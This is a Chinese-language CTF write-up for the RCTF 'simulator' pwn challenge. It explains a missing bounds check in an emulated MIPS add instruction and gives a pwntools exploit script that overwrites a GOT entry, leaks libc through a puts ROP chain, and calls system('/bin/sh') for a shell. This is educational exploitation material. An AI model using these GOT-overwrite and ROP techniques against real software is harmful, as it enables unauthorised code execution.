# RCTF simulator
## Author： 文火

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>学习了NextLine队伍的wp（[原链接](https://lyoungjoo.github.io/2018/05/21/RCTF-2018-Write-Up/)），自己理解复现了一遍，现在我讲解一下：</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>checksec一下关了GOT覆写保护，也关了基址随机化保护，那么就算题目没有给libc也可以用自己的，‘ldd simulator’一下然后用pwntools的ELF读取就行了。这题主要复杂在前面冗长的逆向分析，实际上模拟了MIPS指令，利用技巧上不难，程序对立即数没有检查，可以利用程序逻辑漏洞泄露更改任意地址。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>举个add指令的例子：</font></br>

```C
int __cdecl add(int arg1, signed int arg2, signed int arg3)
{
  int reg; // eax@2
  int v4; // eax@5
  int reg_ptr; // [sp+8h] [bp-8h]@4

  if ( arg2 > 31 )
    reg = arg2 - 32;
  else
    reg = reg_arr[2 * arg2];
  reg_ptr = reg;
  if ( arg3 > 31 )
    v4 = arg3 - 32;
  else
    v4 = reg_arr[2 * arg3];
  reg_arr[2 * arg1] = v4 + reg_ptr;
  return i++ + 1;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这就相当于 add arg1,arg2,arg3。没有寻址检测，这就意味着如果我们不用寄存器的话，可以任意地址写，因为数组访问的本质上就是一些运算寻址罢了。因为可以改写GOT表，而且开了堆栈保护，那么我们可以覆写__stack_chk_fail函数的GOT表，覆盖为我们的payload来getshell。剩下的就是一些常用技巧了，计算基址算出libc的system和'/bin/sh'的地址。</font></br>

Exploit脚本:
=======

```python
asm = []
#利用add修改GOT表
asm.append('add %d, %d' % (c_uint32((1<<32) - 321-0x20).value,0x0804852e))
asm.append('END')

f = ''
for i in asm:
        f += i + "\n"
s.send(f)

#gadget
pr = 0x0804a8cb
pppr = 0x0804b339
lr = 0x080486e8

#泄露puts函数GOT表地址来计算基址
payload = 'A' * 0x30
payload += p32(e.plt['puts']) + p32(pr) + p32(e.got['puts'])
payload += p32(0x804ac58)
s.sendline(payload)

s.recvuntil('leave a comment: ')
libc = u32(s.recv(4)) - l.symbols['puts']
log.info("LIBC :" + hex(libc))

s.sendline('END')
binsh = next(l.search('/bin/sh'))
payload = 'A' * 0x30
payload += p32(libc + l.symbols['system']) + p32(pr) + p32(libc+binsh)
s.sendline(payload)
```
